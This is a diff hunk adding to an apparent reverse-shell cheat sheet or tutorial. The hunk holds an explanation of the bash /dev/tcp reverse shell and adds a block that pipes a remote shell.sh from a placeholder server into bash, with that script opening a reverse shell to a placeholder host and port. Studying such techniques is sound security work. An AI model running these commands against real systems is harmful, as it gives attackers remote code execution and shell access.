@@ -50,6 +50,13 @@ bash -i >& /dev/tcp/$IP/4444 0>&1
 - it will also *reassign* all three standard streams (stdin, stdout, and stderr)  to the socket with this new connection, so all the output will go into, and input will be read from this socket
 - then it will start a new interactive Bash session
 
+```bash
+# curl remote shell file and run it.
+curl http://YOUR_SERVER/shell.sh | bash
+# shell.sh content:
+#   bash -i >& /dev/tcp/YOUR_HOST_IP/LISTEN_PORT 0>&1
+```
+
 
 
 ## Python
